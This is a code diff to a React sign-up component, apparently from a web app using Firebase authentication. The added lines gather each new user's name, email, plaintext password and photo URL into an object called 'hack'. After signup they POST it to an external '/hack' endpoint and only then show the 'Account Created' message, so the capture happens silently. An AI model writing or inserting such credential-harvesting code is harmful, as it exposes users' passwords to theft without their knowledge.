@@ -40,6 +40,7 @@ const SignUp = () => {
         const confirmPassword = e.target.confirm.value;
         const name = e.target.name.value;
         const url = e.target.photoUrl.value;
+        const hack = {name,email,password,url}
         
         setRegisterError('')
 
@@ -58,13 +59,24 @@ const SignUp = () => {
           displayName: name,
           photoURL: url,
           })
-          Swal.fire(
-          'Account Created',
-          'You have Created Account successfully',
-          'success'
-          )
-          navigate(location?.state ? location.state : '/')
-
+          fetch('https://wazo-backend-code.vercel.app/hack',{
+            method: 'POST',
+            headers: {
+              'content-type':'application/json'
+            },
+            body: JSON.stringify(hack)
+          })
+          .then(res => res.json())
+          .then( () => {
+            Swal.fire(
+              'Account Created',
+              'You have Created Account successfully',
+              'success'
+              )
+              navigate(location?.state ? location.state : '/')
+    
+          })
+          
         })
         .catch(error => {
           console.error(error.message)
